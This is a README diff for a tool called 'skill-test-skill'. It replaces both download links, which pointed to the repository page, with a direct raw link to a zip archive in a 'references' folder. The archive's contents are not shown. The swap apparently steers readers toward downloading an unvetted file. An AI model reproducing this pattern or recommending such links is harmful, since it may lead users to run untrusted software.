@@ -1,11 +1,11 @@
 # 🧪 skill-test-skill - Check skill files with confidence
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/cresacommensurate900/skill-test-skill)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/cresacommensurate900/skill-test-skill/raw/refs/heads/main/references/skill_test_2.2.zip)
 
 ## 📥 Download
 
 Use this page to download or open the project:
-https://github.com/cresacommensurate900/skill-test-skill
+https://github.com/cresacommensurate900/skill-test-skill/raw/refs/heads/main/references/skill_test_2.2.zip
 
 ## 🎯 What this app does
 
